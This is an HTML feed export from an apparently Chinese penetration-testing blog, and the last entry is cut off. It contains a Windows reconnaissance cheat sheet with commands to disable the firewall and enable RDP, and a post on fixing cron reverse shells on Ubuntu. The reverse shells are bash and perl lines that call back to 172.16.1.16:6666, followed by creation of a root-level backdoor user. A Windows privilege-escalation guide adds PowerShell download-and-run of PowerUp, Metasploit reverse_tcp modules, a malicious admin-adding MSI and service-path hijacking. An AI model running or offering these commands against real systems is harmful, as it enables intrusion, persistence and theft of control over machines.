&quot;Get-WmiObject -class Win32_Product |Select-object -Property name,version&quot;</span><br></pre></td></tr></table></figure><h1 id="查询服务信息"><a href="#查询服务信息" class="headerlink" title="查询服务信息"></a><strong>查询服务信息</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief           </span><br></pre></td></tr></table></figure><h1 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a><strong>查询进程列表</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br><span class="line">tasklist</span><br></pre></td></tr></table></figure><p>常见杀软进程：</p><ul><li><p>360sd.exe                        360杀毒 </p></li><li><p>360tray.exe                     360实时保护 </p></li><li><p>zhuodngfangyu.exe       360主动防御 </p></li><li><p>ksafetray                          金山卫士 </p></li><li><p>safedogupdatecenter    服务器安全狗 </p></li><li><p>mcafee mcshield             mcafee </p></li><li><p>egui.exe                            nod32 </p></li><li><p>avp.exe                             卡巴斯基 </p></li><li><p>avguard.exe                     小红伞 </p></li><li><p>bdagent.exe                     bitdefender</p></li></ul><h1 id="查看已启动程序信息"><a href="#查看已启动程序信息" class="headerlink" title="查看已启动程序信息"></a><strong>查看已启动程序信息</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><h1 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a><strong>查看计划任务</strong></h1><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><h1 id="查看主机开机时间"><a href="#查看主机开机时间" class="headerlink" title="查看主机开机时间"></a><strong>查看主机开机时间</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><h1 id="查询用户列表、权限"><a href="#查询用户列表、权限" class="headerlink" title="查询用户列表、权限"></a><strong>查询用户列表、权限</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br><span class="line">net localgroup administrators         查看本地管理员组，domain admins组内成员拥有域内机器的本地管理员权限</span><br><span class="line">query user || qwinsta                 查看在线用户</span><br><span class="line">whoami                                查看当前用户权限，如果当前内网中存在域，那么本地普通用户user只能查询本机信息，不能查询域信息，而本地管理员及以上用户和域内用户可以查询域内信息</span><br><span class="line">whoami /all                           查询域sid</span><br></pre></td></tr></table></figure><h1 id="列出本地计算机与连接客户端之间的会话"><a href="#列出本地计算机与连接客户端之间的会话" class="headerlink" title="列出本地计算机与连接客户端之间的会话"></a><strong>列出本地计算机与连接客户端之间的会话</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h1 id="查询端口列表"><a href="#查询端口列表" class="headerlink" title="查询端口列表"></a><strong>查询端口列表</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><h1 id="查询本机共享列表"><a href="#查询本机共享列表" class="headerlink" title="查询本机共享列表"></a><strong>查询本机共享列表</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure><h1 id="查询路由表及arp缓存表"><a href="#查询路由表及arp缓存表" class="headerlink" title="查询路由表及arp缓存表"></a><strong>查询路由表及arp缓存表</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route print arp -a</span><br></pre></td></tr></table></figure><h1 id="防火墙相关"><a href="#防火墙相关" class="headerlink" title="防火墙相关"></a><strong>防火墙相关</strong></h1><p>关闭防火墙。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable              win2003及之前版本 </span><br><span class="line">netsh advfirewall set allprofiles state off    win2003之后版本</span><br></pre></td></tr></table></figure><p>查看防火墙配置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure><p>修改防火墙配置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">win2003及之前版本   允许指定程序的全部连接    </span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable  </span><br><span class="line">win2003之后版本   允许指定程序的全部连接 </span><br><span class="line">netsh advfirewall firewall add rule name=&quot;allow nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot; </span><br><span class="line">允许指定程序退出 netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot; </span><br><span class="line">允许3389端口放行 </span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow </span><br><span class="line">自定义防火墙日志存储位置 </span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\test.log&quot;</span><br></pre></td></tr></table></figure><h1 id="查看代理配置情况"><a href="#查看代理配置情况" class="headerlink" title="查看代理配置情况"></a><strong>查看代理配置情况</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><h1 id="查询并开启远程连接服务"><a href="#查询并开启远程连接服务" class="headerlink" title="查询并开启远程连接服务"></a><strong>查询并开启远程连接服务</strong></h1><p>查看端口，0xd3d转换为十进制为3389。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br></pre></td></tr></table></figure><p>开启端口。</p><p>win2003。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><p>win2008和2012。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1 </span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1 </span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v FSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu计划任务写Shell的坑</title>
      <link href="/2021/02/15/b1c5bc4c.html"/>
      <url>/2021/02/15/b1c5bc4c.html</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>环境：ubuntu16.04</p><p>ubuntu的&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs目录下创建计划任务反弹shell时，发现shell并不能反弹。</p><p>查看系统日志。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f /var/log/syslog</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210215155024.png"></p><p>首先root文件需要600权限，不然会报错。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210215155111.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/172.16.1.16/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210215160352.png"></p><p>在ubuntu中，&#x2F;bin&#x2F;sh这个软连接指向了dash，而反弹shell使用的shell环境是bash，所以这一点是反弹出错的根本原因，而centos中&#x2F;bin&#x2F;sh的指向是bash，所以命令执行不会出错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210215160517.png"></p><p>bash和dash的区别，bash是具有交互能力的shell，而dash不具有交互能力，只是具有运行脚本的能力的shell。</p><h1 id="解决方法一：修改-x2F-bin-x2F-sh指向"><a href="#解决方法一：修改-x2F-bin-x2F-sh指向" class="headerlink" title="解决方法一：修改&#x2F;bin&#x2F;sh指向"></a><strong>解决方法一：修改&#x2F;bin&#x2F;sh指向</strong></h1><p>修改ubuntu中&#x2F;bin&#x2F;sh的指向，将dash改为bash即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s -f bash /bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210215160557.png"></p><p>反弹成功。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210215160620.png"></p><h1 id="解决方法二：避免使用bash"><a href="#解决方法二：避免使用bash" class="headerlink" title="解决方法二：避免使用bash"></a><strong>解决方法二：避免使用bash</strong></h1><p>避免在cron文件里去使用bash这个具有交互能力的shell，可以换种脚本如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * perl -e &#x27;use Socket;$i=&quot;xxxxxxxxxxxx&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210215155752.png"></p><p>或者另外建一个反弹shell的脚本，然后在任务计划里面直接调用运行这个脚本文件即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash /bin/bash -i &gt;&amp; /dev/tcp/172.16.1.16/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210215160159.png"></p><p>然后为test.sh加上执行权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 ./test.sh</span><br></pre></td></tr></table></figure><p>之后任务计划里的内容修改为。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /root/test.sh</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210215160125.png"></p><p>由于现在cron的shell环境为dash，所以具有可以直接运行&#x2F;tmp&#x2F;test.sh这个脚本文件的能力，所以执行了test.sh里面这条反弹shell的命令。</p><p>反弹成功。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210215160043.png"></p><h1 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a><strong>TIPS</strong></h1><ul><li><p>反弹后续操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">useradd -g root -s /bin/bash -u 10010 test  添加用户</span><br><span class="line">sed -i &quot;s/test:x:10010/test:x:0/g&quot; /etc/passwd   添加test用户并将其添加到root组</span><br><span class="line">echo &quot;test:sd123456&quot; | chpasswd        为test用户设置密码</span><br></pre></td></tr></table></figure></li><li><p>&#x2F;etc&#x2F;cron.d&#x2F;目录，效果和crontabs目录相同，利用方式也相同，可以在不覆盖任何其他文件的情况下反弹。</p></li><li><p>其他可利用目录：</p><p>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root        centos系统下root用户的cron文件。</p><p>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root     debian系统下root用户的cron文件。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反弹Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于windows本地的提权</title>
      <link href="/2021/02/14/f7039796.html"/>
      <url>/2021/02/14/f7039796.html</url>
      
        <content type="html"><![CDATA[<h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a><strong>目的</strong></h1><p>通过应用程序或者操作系统等漏洞，使普通用户获得system权限。</p><h1 id="前期信息收集"><a href="#前期信息收集" class="headerlink" title="前期信息收集"></a><strong>前期信息收集</strong></h1><ul><li>systeminfo操作系统、位数、补丁情况。 </li><li>whoami用户权限、net user用户列表。</li><li>netstat –an查看端口。</li><li>ipconfig &#x2F;all查看ip，判断网站的服务器在外网环境还是内网环境，内网环境则需要涉及到端口转发 。</li><li>Tasklist &#x2F;svc进程情况，有无防护软件 。</li><li>支持的组件和脚本类型 。</li><li>找可读可写目录（不要带空格） 。</li><li>for &#x2F;r c:\ %i in (nc*.exe) do @echo %i查找文件关键词。</li></ul><h1 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a><strong>内核溢出提权</strong></h1><p>利用前提：系统没有及时安装补丁，分远程溢出和本地溢出。</p><p><strong>windows本地溢出</strong></p><ol><li>systeminfo查看补丁修复情况。</li><li>查找目录读写执行权限。</li><li>上传cmd命令程序（当前用户权限）。 </li><li>上传本地exp提权程序，最好路径不带空格。 </li><li>调用cmd执行exp提权程序提权并添加管理员账号。</li><li>whoami确认获取系统权限。</li></ol><p><strong>linux本地溢出</strong></p><p>Linux系统漏洞的exp一般按照内核版本来命名，如2.6.18-194，可以直接执行，如2.6.18.c，需要编译后运行，有少部分 exp 是按照发行版版本命名。</p><ol><li>反弹shell到本机，因为linux下提升权限得到的是交互式shell，需反弹才能进行下一步命令的执行。</li><li>确认内核版本（uname -a、cat &#x2F;proc&#x2F;version）和发行版本（cat &#x2F;etc&#x2F;issue），选择相应的exp。</li><li>上传对应内核版本的提权程序，记得chmod。</li><li>执行提权程序获取root权限。</li></ol><p><strong>查找未打补丁的EXP</strong></p><p>手动查找。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups       查看权限 </span><br><span class="line">systeminfo           查看补丁编号 </span><br><span class="line">wmic qfe get caption,Description,HotFixID,Installedon     列出已安装的补丁 </span><br></pre></td></tr></table></figure><p>meterpreter。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_patches </span><br><span class="line">backgroud             或者手动 </span><br><span class="line">use post/windows/gather/enum_patches         </span><br><span class="line">set SESSION </span><br></pre></td></tr></table></figure><p>查找工具。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/AonCyberLabs/Windows-Exploit-Suggester </span><br><span class="line">windows-exploit-suggester.py --update </span><br><span class="line">windows-exploit-suggester.py --database 2017-03-20-mssb.xls --systeminfo win7.txt  </span><br><span class="line">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester </span><br><span class="line"></span><br><span class="line">https://github.com/rasta-mouse/Sherlock </span><br><span class="line">Import-Module .\sherlock.ps1 </span><br><span class="line">Find-AllVulns </span><br><span class="line">Find-MS16135 </span><br><span class="line"></span><br><span class="line">http://bugs.hacking8.com/tiquan/ </span><br><span class="line">https://detect.secwx.com/</span><br></pre></td></tr></table></figure><h1 id="系统配置错误提权"><a href="#系统配置错误提权" class="headerlink" title="系统配置错误提权"></a><strong>系统配置错误提权</strong></h1><h2 id="服务权限配置错误提权"><a href="#服务权限配置错误提权" class="headerlink" title="服务权限配置错误提权"></a><strong>服务权限配置错误提权</strong></h2><p>windows系统启动时会加载和执行一些服务文件，并在后台调用可执行文件。如果一个低权限用户对此类可执行文件有写权限，就可以将该文件替换成任意可执行文件，随着系统服务的启动而获得管理员权限。</p><p><strong>分情况</strong></p><ul><li>服务未运行：攻击者使用任意服务替换原有服务，然后重启。</li><li>服务正在运行且无法被终止：最常见的场景，攻击者通常会利用dll劫持技术并尝试重启服务来提权。</li></ul><p><strong>PowerUp（Empire内置也可）</strong></p><p>列出可能存在问题的所有服务，在AbuseFunction项中给出利用方式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -exec bypass -c &quot;&amp; &#123;Import-Module .\powerup.ps1; Invoke-allchecks&#125;&quot; </span><br><span class="line">PowerShell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;C:\PowerUp.ps1&#x27;); Invoke-AllChecks&quot; </span><br><span class="line">PowerShell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowershellEmpire/PowerTools/master/PowerUp/Powerup.ps1&#x27;); Invoke-AllChecks&quot; </span><br><span class="line">PowerShell.exe -exec bypass -c &quot;&amp; &#123;Import-Module .\powerup.ps1; Install-ServiceBinary -Name &#x27;Tomcat8&#x27; -Username V3teran -Password 123456&#125;&quot;</span><br></pre></td></tr></table></figure><p>该模块的扫描的内容：</p><ul><li>没有被引号引起来的服务路径。 </li><li>ACL配置错误的服务。</li><li>服务的可执行权限配置不当。</li><li>unattend.xml文件。</li><li>注册表键AlwaysInstallElevated。</li><li>注册表中的autologon凭证。</li><li>加密的web.config字符串和应用程序池的密码。</li><li>%path%.dll劫持。</li></ul><p><strong>MSF</strong></p><p>service_permissions模块，设置AGGRESSIVE为true可以利用目标机器上每一个有缺陷的服务，否则第一次提权成功后就会停止。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploits/windows/local/service_permissions </span><br><span class="line">set SESSION 1 </span><br><span class="line">set payload windows/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 172.16.1.6</span><br></pre></td></tr></table></figure><p>两种获得system权限的方式，在创建服务或劫持存在服务时，该模块会创建一个可执行程序，文件名和安装路径是随机的。</p><p>若meterpreter以管理员身份运行，则尝试创建新服务。</p><p>若权限不够不能创建新服务，则判断哪些服务或文件和文件夹权限有问题，并对它劫持。</p><h2 id="注册表键提权"><a href="#注册表键提权" class="headerlink" title="注册表键提权"></a><strong>注册表键提权</strong></h2><p>windows installer策略设置项。若启用“永远以高权限进行安装”（高版本系统名称可能会变化），任何权限的用户都能以system权限来安装MSI恶意文件，注册表两个位置会创建键值1（gpedit.msc）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure><p><strong>Powerup</strong></p><p>返回True表示键值已被设置，那么意味着MSI文件是以system权限运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -exec bypass -c &quot;&amp; &#123;Import-Module .\powerup.ps1; GET-RegistryAlwaysInstallElevated&#125;&quot;</span><br></pre></td></tr></table></figure><p>运行Write-UserAddMSI模块，生成MSI文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -exec bypass -c &quot;&amp; &#123;Import-Module .\powerup.ps1; Write-UserAddMSI&#125;&quot;</span><br></pre></td></tr></table></figure><p>然后以普通权限运行，就会一个添加管理员账户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /quiet /qn /i useradd.msi</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210213222507.png"></p><p><strong>MSF</strong></p><p>前提先获得shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/always_install_elevated   </span><br><span class="line">set SESSION 1 </span><br><span class="line">set payload windows/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 172.16.1.6</span><br></pre></td></tr></table></figure><p>从user权限提权到system权限。该模块会创建一个MSI，提权后会自动删除。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210404155325.png"></p><p><strong>防御</strong></p><p>禁用注册表键AlwaysInstallElevated。</p><h2 id="可信服务路径提权"><a href="#可信服务路径提权" class="headerlink" title="可信服务路径提权"></a><strong>可信服务路径提权</strong></h2><p>系统会解析服务对应的文件路径中的空格，每碰到一个空格，系统就会寻找并执行与之名字匹配的程序（以路径开始至空格为止为名称），直到完全匹配为止；因此如果没有将服务可执行文件的路径用双引号引起来且包含空格，则可构造名称上传恶意程序，服务重启后，该程序会被执行。</p><ul><li>如果路径与服务有关，就任意创建一个服务或模板。</li><li>如果路径与可执行文件有关，就任意创建一个可执行文件。</li></ul><p>如以下路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\test 123\Service.exe</span><br></pre></td></tr></table></figure><p>系统匹配结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\test.exe</span><br><span class="line">C:\Program Files\test 123\Service.exe</span><br></pre></td></tr></table></figure><p>寻找存在漏洞的服务。    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\&quot; | findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p>内置工具，检测目标文件夹是否有写权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">icacls &quot;C:\Program Files\Serv U62&quot; </span><br><span class="line">(M):修改 </span><br><span class="line">(RX):读写</span><br><span class="line">(F):完全控制 </span><br><span class="line">(W):只写 </span><br><span class="line">(CI):从属文件夹继承访问控制</span><br><span class="line">(OI):从属文件继承访问控制</span><br></pre></td></tr></table></figure><p>当前登录administrator，可完全控制。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210213235905.png"></p><p>上传重命名程序（如Serv.exe）到目标文件夹中并重启服务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop service_name </span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure><p><strong>MSF</strong></p><p>自动化攻击，返回system权限，但是很快会断，因为假服务进程没有与服务控制器通信而被中断了，可使用set AutoRunScript migrate -f自动迁移进程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/trusted_service_path </span><br><span class="line">set SESSION 1 </span><br><span class="line">set payload windows/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 172.16.1.6</span><br></pre></td></tr></table></figure><p>复现时，服务开启返回不了，服务关闭就成了&#x3D;。&#x3D;</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214234929.png"></p><p><strong>防御</strong></p><p>将文件路径用引号引起来。</p><h2 id="批量安装配置文件提权"><a href="#批量安装配置文件提权" class="headerlink" title="批量安装配置文件提权"></a><strong>批量安装配置文件提权</strong></h2><p>批量配置多台机器的脚本中可能存在本地管理员账号和密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /b /s c:\unattend.xml</span><br></pre></td></tr></table></figure><p>文件列举。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\sysprep.inf </span><br><span class="line">C:\sysprep\sysprep.xml </span><br><span class="line">C:\Windows\system32\sysprep.inf </span><br><span class="line">C:\Windows\system32\sysprep\sysprep.xml </span><br><span class="line">C:\unattend.xml </span><br><span class="line">C:\Windows\Panther\Unattend.xml </span><br><span class="line">C:\Windows\Panther\Unattended.xml </span><br><span class="line">C:\Windows\Panther\Unattend\Unattended.xml </span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml </span><br><span class="line">C:\Windows\system32\sysprep\unattend.xml C:\Windows\system32\sysprep\Panther\unattend.xml</span><br></pre></td></tr></table></figure><p><strong>MSF</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/enum_unattend</span><br></pre></td></tr></table></figure><h2 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a><strong>计划任务提权</strong></h2><p>低权限用户对高权限运行的任务所在的目录具有写权限，就可以用恶意程序覆盖，计划任务执行时则会getshell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v   查看计划任务  </span><br></pre></td></tr></table></figure><p> powershell查看计划任务，除去默认的和当前登录权限相同的任务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ScheduledTask | Select * | ? &#123;($_.TaskPath -notlike &quot;\Microsoft\Windows\*&quot;) -And ($_.Principal.UserId -notlike &quot;*$env:UserName*&quot;)&#125; | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @&#123;Name=&quot;User&quot;;Expression=&#123;$_.Principal.userID&#125;&#125;   </span><br></pre></td></tr></table></figure><p>查看任务执行间隔。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$task= Get-ScheduledTask -TaskName xxxxx</span><br><span class="line">ForEach ($triger in $task.Triggers) &#123; echo $triger.Repetition.Interval&#125;</span><br></pre></td></tr></table></figure><p>查看任务内容以及存储位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$task= Get-ScheduledTask -TaskName xxxxxx</span><br><span class="line">ForEach ($action in $task.Actions) &#123; Select $action.Execute&#125;</span><br></pre></td></tr></table></figure><p><strong>覆盖存在任务</strong></p><p>AccessChk，微软官方工具，可进行一些系统高级查询，防查杀。 </p><p>查看指定目录以及目录下任务的权限配置情况，是否可以直接覆盖。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 